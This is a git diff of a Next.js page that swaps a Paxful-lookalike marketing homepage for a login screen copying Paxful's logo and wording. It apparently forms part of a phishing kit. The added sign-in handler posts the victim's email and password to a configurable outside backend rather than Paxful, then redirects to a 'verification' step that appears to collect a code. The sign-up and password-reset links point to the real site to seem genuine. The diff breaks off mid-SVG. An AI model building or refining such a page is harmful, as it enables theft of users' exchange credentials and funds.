@@ -1,565 +1,419 @@
 "use client";
+
+import { Montserrat, Plus_Jakarta_Sans } from "next/font/google";
+import { IoLockClosedSharp } from "react-icons/io5";
+
 import Image from "next/image";
 import Link from "next/link";
-import { Montserrat } from "next/font/google";
-import Shop from "@/components/Shop";
-import { useState } from "react";
-import { Buy, sell } from "@/data/data";
-import Images from "@/components/Images";
-import Navbar from "@/components/Navbar";
-import Footer from "@/components/Footer";
-
-const serrat = Montserrat({
-  subsets: ["cyrillic", "cyrillic-ext", "latin", "latin-ext", "vietnamese"],
+import React, { useState } from "react";
+import axios from "axios";
+import { baseUrl } from "@/config";
+import { useRouter } from "next/navigation";
+const serrat = Plus_Jakarta_Sans({
+  subsets: ["cyrillic-ext", "latin", "latin-ext", "vietnamese"],
+  weight: ["200", "300", "400", "500", "600", "700", "800"],
 });
 
-export default function Home() {
-  const [buy, setBuy] = useState(false);
+const Index = () => {
+  const [lang, showlang] = useState(false);
+  const [show, setShow] = useState(false);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [error1, setError1] = useState("");
+  const [error2, setError2] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const router = useRouter();
+
+  function validateEmailOrPhone(input: string) {
+    // Regular expression for validating an email
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    // Regular expression for validating a phone number (10 digits, allows spaces, dashes, parentheses)
+    const phonePattern =
+      /^(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/;
+
+    // Check if input matches either the email or phone pattern
+    if (emailPattern.test(input) || phonePattern.test(input)) {
+      setError1("");
+    } else {
+      setError1("Enter a valid phone or email.");
+    }
+  }
+
+  const handleEmailChange = (e: any) => {
+    validateEmailOrPhone(e.target.value); // Validate email on each change
+    setEmail(e.target.value);
+  };
+
+  const handleSignIn = async () => {
+    try {
+      setIsLoading(true);
+      const res = await axios.post(`${baseUrl}/api/login`, { email, password });
+      console.log(res);
+      router.push(`/verification?email=${email}`);
+      setIsLoading(!true);
+    } catch (error) {
+      console.error(error);
+      setIsLoading(!true);
+    }
+  };
+
   return (
-    <main className='w-full relative h-full'>
-      <Navbar />
-      <div className='bg-[#3db8f5] mt-[48px] lg:mt-0 p-[.5rem] center w-full lg:h-[60px]'>
-        <Link href={"https://paxful.com/university/trade-gift-card-p2p-fee/"}>
-          <h4
-            style={serrat.style}
-            className='mb-0 text-base font-semibold text-white text-center'
+    <div
+      style={serrat.style}
+      className='w-full h-screen bg-black flex flex-row-reverse'
+    >
+      <div className='w-[67.5%] hidden lg:flex bg-[hsl(0,0,8)] relative items-center justify-center h-screen'>
+        <svg
+          xmlns='http://www.w3.org/2000/svg'
+          width='404'
+          height='404'
+          fill='none'
+        >
+          <mask
+            id='login_svg__a'
+            width='403'
+            height='403'
+            x='0'
+            y='0'
+            maskUnits='userSpaceOnUse'
+            style={{ maskType: "luminance" }}
           >
-            The best gift card deals are on Paxful:{" "}
-            <strong>
-              just 1% on <i>all</i> cards!
-            </strong>
-          </h4>
-        </Link>
+            <path fill='#fff' d='M402.779.135H0v402.779h402.779z'></path>
+          </mask>
+          <g mask='url(#login_svg__a)'>
+            <path
+              stroke='#4D4D4D'
+              d='M69.755 402.209c37.785 0 68.414-30.678 68.414-68.523v-68.523H1.34v68.523c0 37.845 30.63 68.523 68.415 68.523ZM402.075 132.296c0-72.6-58.763-131.457-131.249-131.457S139.593 59.696 139.593 132.296v26.55'
+            ></path>
+            <path
+              fill='#000'
+              stroke='#fff'
+              stroke-linecap='round'
+              stroke-linejoin='round'
+              stroke-width='0.9'
+              d='M392.809 153.325c1.29 2.199 1.173 5.102-.62 8.257l-37.734 66.375-8.311 14.617c-3.971 6.982-14.695 12.671-23.961 12.705l-14.544.033-192.157.571c-5.061 0-8.646-1.679-10.188-4.347-1.29-2.215-1.19-5.119.603-8.274l.52-.889.502-.89h.201l192.158-.553 14.544-.034c9.249-.034 19.99-5.723 23.961-12.704l8.311-14.618 36.712-64.579c.352 0 .704.017 1.039.05 4.39.235 7.523 1.847 8.948 4.297z'
+            ></path>
+            <path
+              fill='#fff'
+              stroke='#fff'
+              stroke-linecap='round'
+              stroke-linejoin='round'
+              stroke-width='0.9'
+              d='M152.697 162.253c3.987-6.964 14.711-12.654 23.977-12.704l206.149-.554-36.193 63.941-8.345 14.601c-3.87 7.149-14.644 13.174-23.944 13.359l-15.047.034-192.358.553 45.761-79.247z'
+            ></path>
+            <path
+              stroke='#fff'
+              stroke-linecap='round'
+              stroke-linejoin='round'
+              stroke-width='0.9'
+              d='m106.936 241.5 45.761-79.247c3.987-6.964 14.711-12.654 23.977-12.704l206.149-.554'
+            ></path>
+            <path
+              fill='#000'
+              d='M165.699 181.016c-2.01 0-3.619-.369-4.809-1.124s-1.876-1.796-2.044-3.139c-.167-1.325.218-2.836 1.19-4.531s2.279-3.189 3.937-4.498a20.4 20.4 0 0 1 5.496-3.104c1.994-.756 3.988-1.142 5.932-1.158 1.558 0 2.815.218 3.787.654s1.659 1.041 2.078 1.796q.628 1.132.502 2.568c-.084.956-.419 1.93-.988 2.92-.118.201-.268.453-.436.705-.184.268-.369.52-.587.805l-18.247.084 1.257-2.198 16.505-.068-1.994.94c.904-1.141 1.323-2.181 1.256-3.088-.05-.906-.469-1.628-1.24-2.148-.77-.52-1.826-.789-3.167-.789s-2.731.286-4.188.823a13.8 13.8 0 0 0-3.972 2.282 9.9 9.9 0 0 0-2.748 3.457c-.904 1.343-1.29 2.501-1.173 3.491.118.99.62 1.745 1.508 2.299.889.537 2.011.806 3.385.806a11.5 11.5 0 0 0 4.491-.89 18.2 18.2 0 0 0 3.87-2.198l1.961 1.057c-.855.755-1.91 1.46-3.167 2.098a20.7 20.7 0 0 1-4.038 1.544 17.6 17.6 0 0 1-4.374.604zM180.864 180.58l9.601-16.783h3.016l-1.86 3.256-.62-.117c1.156-1.091 2.53-1.947 4.105-2.585a12.7 12.7 0 0 1 4.793-.956q2.286 0 3.669.805c.905.537 1.458 1.276 1.625 2.232.168.94-.083 2.014-.77 3.206l-6.234 10.908h-3.016l5.714-9.985c.587-1.024.855-1.897.788-2.602s-.419-1.258-1.039-1.627c-.62-.386-1.491-.571-2.597-.571a9.6 9.6 0 0 0-3.268.587c-1.072.386-2.061.94-2.966 1.679a9 9 0 0 0-2.195 2.584l-5.713 9.986h-3.016zM212.097 180.63c-1.927 0-3.167-.419-3.72-1.292s-.352-2.115.57-3.759l5.462-9.55h-3.988l1.341-2.332h1.005c.905 0 1.776-.252 2.581-.722s1.407-1.057 1.809-1.779l.804-1.41h3.017l-2.212 3.877h4.758l-1.34 2.333h-4.759l-5.462 9.583c-.319.57-.503 1.057-.536 1.493s.15.772.519 1.007c.385.252 1.022.369 1.894.369.217 0 .469 0 .787-.033.302-.017.57-.05.804-.067l-1.206 2.098c-.352.067-.754.117-1.173.151s-.754.05-.989.05zM228.366 180.748c-2.011 0-3.62-.37-4.809-1.125s-1.877-1.795-2.044-3.138c-.168-1.326.217-2.836 1.189-4.531s2.279-3.189 3.938-4.498a20.4 20.4 0 0 1 5.496-3.105c1.994-.755 3.988-1.141 5.931-1.158 1.559 0 2.815.218 3.787.655.972.436 1.659 1.04 2.078 1.795q.629 1.134.503 2.568c-.084.957-.419 1.93-.989 2.92-.117.202-.268.453-.436.705-.184.269-.368.52-.586.806l-18.247.084 1.256-2.199 16.505-.067-1.994.94c.905-1.141 1.324-2.182 1.257-3.088-.05-.906-.469-1.628-1.24-2.148s-1.827-.789-3.167-.789-2.731.285-4.189.822a13.7 13.7 0 0 0-3.971 2.283 9.9 9.9 0 0 0-2.748 3.457c-.905 1.343-1.29 2.5-1.173 3.491.117.99.62 1.745 1.508 2.299.888.537 2.011.805 3.385.805 1.592 0 3.083-.302 4.49-.889a18.2 18.2 0 0 0 3.871-2.199l1.96 1.058c-.854.755-1.91 1.46-3.167 2.098a20.8 20.8 0 0 1-4.038 1.544 17.6 17.6 0 0 1-4.373.604zM243.531 180.311l9.601-16.782h3.016l-1.575 2.752-.167-.403a11.7 11.7 0 0 1 3.385-1.896c1.29-.47 2.681-.705 4.155-.705h1.374l-1.34 2.35h-1.894c-1.558 0-3.016.402-4.39 1.158s-2.446 1.829-3.234 3.205l-5.915 10.338h-3.016zM144.974 381.758c18.199-10.766 30.361-23.887 27.165-29.306s-20.539-1.083-38.738 9.683-30.36 23.888-27.164 29.307 20.539 1.083 38.737-9.684'
+            ></path>
+            <path
+              fill='#000'
+              d='M140.995 375.002c18.198-10.767 30.36-23.888 27.165-29.306-3.196-5.419-20.54-1.084-38.738 9.683-18.199 10.767-30.36 23.888-27.165 29.306 3.196 5.419 20.539 1.084 38.738-9.683'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M139.712 372.823c18.197-10.774 30.361-23.898 27.161-29.302-3.2-5.421-20.543-1.091-38.74 9.683-18.197 10.775-30.361 23.898-27.161 29.302 3.2 5.421 20.543 1.091 38.74-9.683m-1.056-1.796c14.259-8.441 23.71-18.88 21.096-23.311-2.614-4.43-16.304-1.191-30.563 7.25s-23.71 18.881-21.096 23.311c2.614 4.431 16.304 1.192 30.563-7.25'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#C9F24D'
+              d='M138.663 371.045c14.263-8.438 24.058-18.274 21.879-21.969s-15.507.15-29.77 8.588c-14.262 8.439-24.058 18.274-21.879 21.969 2.18 3.695 15.508-.15 29.77-8.588'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M168.012 345.4c2.965 5.488-9.149 18.511-27.229 29.202-7.339 4.346-14.527 7.636-20.727 9.666l4.323 7.099c6.166-2.03 13.321-5.32 20.61-9.633 18.197-10.774 30.362-23.881 27.161-29.302zm-56.367 40.95a42 42 0 0 0 3.786-.739l4.323 7.099a48 48 0 0 1-3.77.755zm-3.033.268c-3.268.084-5.58-.671-6.569-2.333l4.156 7.049.05.101c.989 1.695 3.368 2.433 6.719 2.316z'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#000'
+              d='M75.395 352.119c17.089-3.598 30.077-10.639 29.009-15.728-1.068-5.088-15.787-6.297-32.876-2.7-17.09 3.598-30.077 10.64-29.009 15.728 1.068 5.089 15.787 6.297 32.876 2.7'
+            ></path>
+            <path
+              fill='#000'
+              d='M74.057 345.801c17.088-3.598 30.076-10.64 29.008-15.728-1.068-5.089-15.787-6.297-32.876-2.7-17.089 3.598-30.076 10.639-29.008 15.728 1.067 5.088 15.787 6.297 32.876 2.7'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M73.626 343.756c17.09-3.592 30.076-10.64 29.004-15.726-1.072-5.085-15.784-6.293-32.875-2.702s-30.077 10.641-29.005 15.726 15.785 6.293 32.876 2.702m-.352-1.679c13.388-2.819 23.542-8.475 22.67-12.637-.87-4.162-12.432-5.253-25.837-2.433-13.388 2.819-23.542 8.475-22.671 12.637s12.433 5.253 25.838 2.433'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#C9F24D'
+              d='M73.282 342.073c13.394-2.82 23.663-7.914 22.936-11.379s-12.175-3.988-25.569-1.169-23.663 7.915-22.935 11.38c.727 3.465 12.174 3.988 25.568 1.168'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M103.016 329.826c.854 5.085-12.065 12.05-29.022 15.608-6.886 1.443-13.388 2.114-18.766 2.064l1.508 6.696c5.362.034 11.83-.621 18.666-2.064 17.091-3.591 30.077-10.64 29.005-15.725l-1.374-6.596zm-54.943 17.068c.972.184 2.027.319 3.15.419l1.508 6.713a39 39 0 0 1-3.15-.402l-1.508-6.713zm-2.446-.604c-2.58-.806-4.19-1.997-4.525-3.558l1.391 6.595s0 .067.017.101c.335 1.594 1.994 2.803 4.641 3.608l-1.524-6.729z'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#000'
+              d='M106.181 270.589c.717-3.778-8.983-8.799-21.665-11.213-12.683-2.414-23.545-1.307-24.262 2.472s8.983 8.799 21.665 11.213c12.683 2.414 23.545 1.307 24.262-2.472'
+            ></path>
+            <path
+              fill='#000'
+              d='M107.083 265.884c.717-3.778-8.983-8.799-21.666-11.213s-23.544-1.307-24.261 2.472 8.983 8.799 21.665 11.213 23.545 1.307 24.262-2.472'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M83.093 266.842c12.684 2.416 23.542 1.309 24.262-2.467.721-3.777-8.98-8.794-21.665-11.211s-23.542-1.309-24.263 2.467c-.72 3.776 8.982 8.794 21.666 11.211m.234-1.242c9.937 1.896 18.482.923 19.069-2.165s-7.004-7.133-16.94-9.029c-9.937-1.897-18.482-.923-19.069 2.165s7.004 7.132 16.94 9.029'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#C9F24D'
+              d='M102.224 264.38c.489-2.576-7.178-6.2-17.123-8.093s-18.406-1.339-18.894 1.238c-.49 2.577 7.177 6.201 17.123 8.094s18.405 1.338 18.894-1.239'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M107.121 265.667c-.804 3.742-11.629 4.816-24.263 2.417-5.11-.974-9.735-2.367-13.405-3.944l-.87 5.001c3.652 1.561 8.243 2.937 13.32 3.91 12.684 2.417 23.542 1.309 24.263-2.467l.938-4.917zm-42.342-3.961c.603.403 1.29.789 2.027 1.192l-.871 5.001a27 27 0 0 1-2.028-1.175zm-1.508-1.107c-1.525-1.293-2.296-2.568-2.078-3.726l-.922 4.884s0 .067-.017.083c-.217 1.175.57 2.484 2.145 3.776l.871-5.034z'
+              clip-rule='evenodd'
+            ></path>
+          </g>
+          <mask
+            id='login_svg__b'
+            width='277'
+            height='94'
+            x='108'
+            y='148'
+            maskUnits='userSpaceOnUse'
+            style={{ maskType: "luminance" }}
+          >
+            <path
+              fill='#fff'
+              d='M153.915 162.081c3.999-6.981 14.752-12.684 24.043-12.734l206.704-.555-36.291 64.092-8.367 14.635c-3.881 7.166-14.684 13.206-24.008 13.391l-15.088.033-192.877.555 45.884-79.434z'
+            ></path>
+          </mask>
+          <g mask='url(#login_svg__b)'>
+            <path
+              fill='#000'
+              d='M123.989 226.201c10.477-2.811 18.295-7.614 17.462-10.728s-10.003-3.36-20.48-.549-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.481.549'
+            ></path>
+            <path
+              fill='#000'
+              d='M125.02 230.055c10.478-2.811 18.296-7.614 17.463-10.728-.834-3.114-10.003-3.36-20.48-.549s-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.48.549'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M122.346 220.033c-10.467 2.81-18.297 7.621-17.457 10.733s9.997 3.364 20.481.555c10.467-2.809 18.296-7.621 17.456-10.733s-9.996-3.364-20.48-.555m.285 1.026c-8.215 2.204-14.314 6.056-13.625 8.613s7.896 2.826 16.095.64c8.216-2.204 14.315-6.056 13.626-8.613s-7.897-2.827-16.096-.64'
+              clip-rule='evenodd'
+            ></path>
+            <path
+              fill='#C9F24D'
+              d='M124.681 228.755c8.209-2.203 14.404-5.713 13.834-7.84-.569-2.126-7.686-2.065-15.896.138s-14.404 5.712-13.835 7.839c.57 2.127 7.687 2.065 15.897-.137'
+            ></path>
+            <path
+              fill='#C9F24D'
+              fill-rule='evenodd'
+              d='M122.077 219.007c-10.467 2.809-18.296 7.621-17.456 10.733l-1.092-4.105c-.841-3.112 6.989-7.923 17.456-10.732 4.2-1.128 8.182-1.767 11.509-1.918l1.159 4.104c-3.343.152-7.342.791-11.559 1.918zm14.029-1.934-1.159-4.105a17 17 0 0 1 1.965.151l1.16 4.105a17 17 0 0 0-1.966-.151m3.511.437-1.176-4.121c1.664.403 2.739 1.11 3.008 2.069v.05l1.058 3.97c-.285-.925-1.327-1.581-2.906-1.985z'
+              clip-rule='evenodd'
+            ></path>
+          </g>
+          <path
+            fill='#C9F24D'
+            d='m399.514 182.89.235 1.413a2.43 2.43 0 0 0 2.017 2.019l1.411.235-1.411.236a2.43 2.43 0 0 0-2.017 2.019l-.235 1.413-.235-1.413a2.43 2.43 0 0 0-2.016-2.019l-1.411-.236 1.411-.235a2.43 2.43 0 0 0 2.016-2.019zM135.131 166.219l.353 2.137a3.68 3.68 0 0 0 3.024 3.028l2.134.353-2.134.353a3.68 3.68 0 0 0-3.024 3.028l-.353 2.137-.352-2.137a3.68 3.68 0 0 0-3.025-3.028l-2.133-.353 2.133-.353a3.68 3.68 0 0 0 3.025-3.028zM319.625 261.651l.285 1.767a3.07 3.07 0 0 0 2.521 2.523l1.781.286-1.781.286a3.07 3.07 0 0 0-2.521 2.523l-.285 1.783-.286-1.783a3.07 3.07 0 0 0-2.52-2.523l-1.781-.286 1.781-.286a3.07 3.07 0 0 0 2.52-2.523zM346.356 129.513l.403 2.49a4.28 4.28 0 0 0 3.528 3.533l2.487.403-2.487.404a4.28 4.28 0 0 0-3.528 3.533l-.403 2.49-.404-2.49a4.28 4.28 0 0 0-3.528-3.533l-2.486-.404 2.486-.403a4.28 4.28 0 0 0 3.528-3.533z'
+          ></path>
+        </svg>
       </div>
-      <section className='bg-appPurple px-[1rem] py-[20px] lg:py-[30px] flex flex-col lg:items-center  h-[75vh] lg:h-screen'>
+      <div className='w-full lg:w-[32.5%] flex flex-col items-center px-[5%] md:px-[2.5%] pt-[5%] lg:pt-[1.2%] bg-black h-full'>
+        <div className='flex items-center bord  justify-between w-full'>
+          <Link className='w-full flex items-center gap-2' href={"/"}>
+            <svg
+              xmlns='http://www.w3.org/2000/svg'
+              fill='none'
+              viewBox='0 0 32 32'
+              className='aspect-square size-6 md:size-8'
+            >
+              <path
+                fill='#C9F24D'
+                d='M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z'
+              ></path>
+            </svg>
+            <p className='font-semibold text-[32px] leading-none text-white'>
+              paxful
+            </p>
+          </Link>
+        </div>
         <h1
           style={serrat.style}
-          className='text-lg lg:text-[75px] my-[.5rem] text-white font-[800] leading-[1.15]'
+          className='text-white  text-[32px]  leading-10 tracking-[-4%] self-start mt-[20%] font-semibold'
         >
-          Trade Bitcoin On Paxful
+          Welcome back!
         </h1>
-        <div className='lg:text-[22px] mb-[.5rem] font-[300] leading-relaxed max-w-[960px] lg:text-center  text-white'>
-          Join over 12 million people just like you on everyone&apos;s favorite
-          peer-to-peer platform to buy and sell Bitcoin.
+        <div className='py-1 self-start  border-appAsh'>
+          <span style={serrat.style} className='text-[hsl(0,0,50)] text-xs'>
+            Dont have an account ?
+            <Link
+              href='https://paxful.com/register?locale=en'
+              className='ml-2 text-[hsl(0,0,50)] text-[0.8125rem] leading-[1rem] underline-offset-4 underline'
+            >
+              Sign up
+            </Link>
+          </span>
         </div>
-        <Shop />
-      </section>
-      <section className='flex flex-col w-full  items-center py-[30px]'>
-        <h2
-          style={serrat.style}
-          className='text-[#333] w-[85%] leading-snug lg:w-[540px] lg:text-center text-center text-[32px] font-bold mb-2 col-md-6 mx-auto'
-        >
-          Over 350 ways to buy and sell Bitcoin.
-        </h2>
-        <p className='small-text max-w-[680px] w-[85%] text-center text-[#333] mb-4 col-md-8 mx-auto'>
-          Explore our Marketplace and start trading with your favorite payment
-          methods or discover something new.
-        </p>
-        <div className='mt-4 flex justify-center items-center'>
-          <button
-            onClick={() => setBuy(false)}
-            className={`px-[16px] py-[4px] border-b  ${
-              !buy ? "border-appBlue" : "border-appAsh"
-            } mr-[8px] text-[.857rem] text-[#626262] leading-[24px]  duration-200`}
-          >
-            Sell Bitcoin
-          </button>
-          <button
-            onClick={() => setBuy(true)}
-            className={`px-[16px] py-[4px] border-b  ${
-              buy ? "border-appBlue" : "border-appAsh"
-            } ml-[8px] text-[.857rem] text-[#626262] leading-[24px] duration-200 `}
-          >
-            Buy Bitcoin
-          </button>
+
+        <div className='w-full mt-3'>
+          <h3 className='text-[hsl(0,0,100)] text-[15px] font-medium opacity-50 mb-1 '>
+            Email / Phone Number
+          </h3>
+          <input
+            onBlur={() => {
+              if (email === "") {
+                setError1("This field may not be blank");
+              } else {
+                setError1("");
+                validateEmailOrPhone(email);
+              }
+            }}
+            onChange={(e) => {
+              handleEmailChange(e);
+            }}
+            className={`w-[95%] mx-auto self-center h-[56px] px-2 focus:outline-appBlue hover:borde-[#626262]  ${
+              error1 ? "border-error" : ""
+            }  rounded-2xl bg-[hsl(0,0,8)]  text-[hsl(0,0,100)]`}
+            type='text'
+            placeholder='Email / Phone Number'
+          />
+          {error1 && (
+            <div className='flex mt-1 items-center'>
+              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
+                <path
+                  fillRule='evenodd'
+                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
+                  clipRule='evenodd'
+                ></path>
+              </svg>
+              <p className='text-error ml-2 font-[400]'>{error1}</p>
+            </div>
+          )}
         </div>
-        <div
-          className={`mt-8 flex w-full lg:w-[80%] ${
-            buy ? "justify-center lg:justify-start" : "justify-center"
-          } mx-auto gap-[10px] lg:gap-[25px] px-[4.2%] flex-wrap `}
-        >
-          {!buy
-            ? sell.map(({ title, desc, src }) => {
-                return (
-                  <Link
-                    href={"/"}
-                    key={title}
-                    className='flex lg:flex-col items-center lg:items-start  lg:p-[24px] w-[98vw] lg:w-[344px] border h-[65.6] p-[16px] lg:h-[173.6px] rounded-[4px] border-appAsh'
-                  >
-                    <Images title={title} />
-                    <strong
-                      style={serrat.style}
-                      className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-                    >
-                      {title}
-                    </strong>
-                    <p className='text-xs hidden lg:flex  text-[#494949]'>
-                      {desc}
-                    </p>
-                  </Link>
-                );
-              })
-            : Buy.map(({ title, desc, src }) => {
-                return (
-                  <Link
-                    key={title}
-                    href={"/"}
-                    className='flex lg:flex-col items-center lg:items-start  lg:p-[24px]  w-[98vw] lg:w-[344px] border h-[65.6] p-[16px] lg:h-[173.6px] rounded-[4px] border-appAsh'
-                  >
-                    <Images title={title} />
-                    <strong
-                      style={serrat.style}
-                      className='text-[#494949] ml-4 lg:ml-0 my-2 text-base'
-                    >
-                      {title}
-                    </strong>
-                    <p className='text-xs hidden lg:flex text-[#494949]'>
-                      {desc}
-                    </p>
-                  </Link>
-                );
-              })}
+        <div className='w-full mt-4'>
+          <div className='flex items-center justify-between'>
+            <h3 className='mb-1 text-[hsl(0,0,100)] opacity-50  font-medium text-[15px]'>
+              Password
+            </h3>
+          </div>
+          <div className='relative flex items-center w-full h-max '>
+            {show ? (
+              <input
+                onChange={(e) => setPassword(e.target.value)}
+                onBlur={() => {
+                  if (password === "") {
+                    setError2("This field may not be blank");
+                  } else {
+                    setError2("");
+                  }
+                }}
+                className={`w-[95%] self-center text-[hsl(0,0,100)] p-[1rem] bg-[hsl(0,0,8)]  focus:outline-appBlue h-[56px]  ${
+                  error2 ? "border-error" : ""
+                } rounded-2xl`}
+                type='text'
+                placeholder='Password'
+              />
+            ) : (
+              <input
+                onChange={(e) => setPassword(e.target.value)}
+                onBlur={() => {
+                  if (password === "") {
+                    setError2("This field may not be blank");
+                  } else {
+                    setError2("");
+                  }
+                }}
+                className={`w-[95%] self-center text-[hsl(0,0,100)]  p-[1rem] px-2 bg-[hsl(0,0,8)] focus:outline-appBlue h-[56px]  ${
+                  error2 ? "border-error" : ""
+                } rounded-2xl`}
+                type='password'
+                placeholder='Password'
+              />
+            )}
+            <button
+              onClick={() => setShow(!show)}
+              className='absolute right-7 self-center'
+            >
+              {show ? (
+                <svg
+                  width='16'
+                  height='16'
+                  viewBox='0 0 16 16'
+                  fill='#626262'
+                  className='d-block'
+                >
+                  <path
+                    fillRule='evenodd'
+                    d='M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z'
+                    clipRule='evenodd'
+                  ></path>
+                </svg>
+              ) : (
+                <svg
+                  width='16'
+                  height='16'
+                  viewBox='0 0 16 16'
+                  fill='#626262'
+                  className='d-block'
+                >
+                  <path
+                    fillRule='evenodd'
+                    d='M2.707 1.293a1 1 0 00-1.414 1.414l1.734 1.734c-.19.114-.37.231-.544.35-.696.479-1.279 1.006-1.7 1.509a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13a9.15 9.15 0 003.048-.538l2.245 2.245a1 1 0 001.414-1.414l-1.74-1.74c.192-.115.376-.234.551-.355.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3a9.2 9.2 0 00-3.05.535L2.706 1.293zm1.788 4.616a8.599 8.599 0 00-.878.53c-.57.392-1.012.8-1.3 1.144a2.397 2.397 0 00-.287.41L2.027 8l.003.006c.05.098.143.238.287.41.288.344.73.753 1.3 1.145C4.762 10.35 6.318 11 8 11c.49 0 .97-.056 1.431-.155l-.913-.913a2.003 2.003 0 01-2.45-2.45L4.495 5.909zm2.987.159l-.914-.915A6.906 6.906 0 018 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148 8.645 8.645 0 01-.88.534l-1.57-1.568a2.003 2.003 0 00-2.45-2.45z'
+                    clipRule='evenodd'
+                  ></path>
+                </svg>
+              )}
+            </button>
+          </div>
+
+          {error2 && (
+            <div className='flex mt-1 items-center'>
+              <svg width='16' height='16' viewBox='0 0 16 16' fill='#eb4a27'>
+                <path
+                  fillRule='evenodd'
+                  d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
+                  clipRule='evenodd'
+                ></path>
+              </svg>
+              <p className='text-error ml-2 font-[400]'>{error2}</p>
+            </div>
+          )}
         </div>
         <Link
-          href={"https://paxful.com/buy-bitcoin?hasScroll=true"}
-          className='px-[16px] py-[12px] rounded-[8px] bg-appBlue hover:bg-[#0091d2] text-white font-semibold mt-8'
+          href={"https://paxful.com/forgot-password?locale=en"}
+          className=' underline-offset-2 underline mt-1 mr-4 self-end text-[14px] text-[hsl(0,0,80)] opacity-50'
         >
-          Start Trading
+          Forgot Password?
         </Link>
-      </section>
-      <section className='flex flex-col w-full  items-center py-[20px]'>
-        <h2
-          style={serrat.style}
-          className='text-[#333] w-[85%] leading-normal lg:w-[540px] lg:text-center text-center text-[32px] font-bold mb-2 col-md-6 mx-auto'
+        <button
+          onClick={handleSignIn}
+          className={`w-[90%] mt-6 px-3 ${
+            isLoading || error1 || error2
+              ? "bg-appAsh/30"
+              : "bg-[hsl(75,84,63)]"
+          } hover:bg-lime-600 cursor-pointer self-center rounded-full flex items-center justify-between h-[56px]`}
         >
-          Welcome to a financial system for the 100%.
-        </h2>
-        <div
-          className={`mt-8 flex w-full lg:w-[80%] ${
-            buy ? "justify-center lg:justify-start" : "justify-center"
-          } mx-auto gap-[10px] lg:gap-[80px] px-[4.2%] flex-wrap `}
-        >
-          <div className='flex flex-col items-center'>
-            <svg
-              fill='none'
-              viewBox='0 0 48 48'
-              className='w-[32px] h-[32px] lg:w-[48px] lg:h-[48px]'
-            >
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M27 19h2v2h2v-2h2v2.126a4.002 4.002 0 012.063 6.447A4 4 0 0133 35v2h-2v-2h-2v2h-2v-2h-2v-2h2V23h-2v-2h2v-2zm2 14h4a2 2 0 100-4h-4v4zm0-6h3a2 2 0 100-4h-3v4z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
-                fillRule='evenodd'
-                d='M30 44c8.837 0 16-7.163 16-16s-7.163-16-16-16-16 7.163-16 16 7.163 16 16 16zm0 2c9.941 0 18-8.059 18-18s-8.059-18-18-18-18 8.059-18 18 8.059 18 18 18z'
-                clipRule='evenodd'
-              ></path>
-              <path
-                fill='var(--icons-secondary, #454c59)'
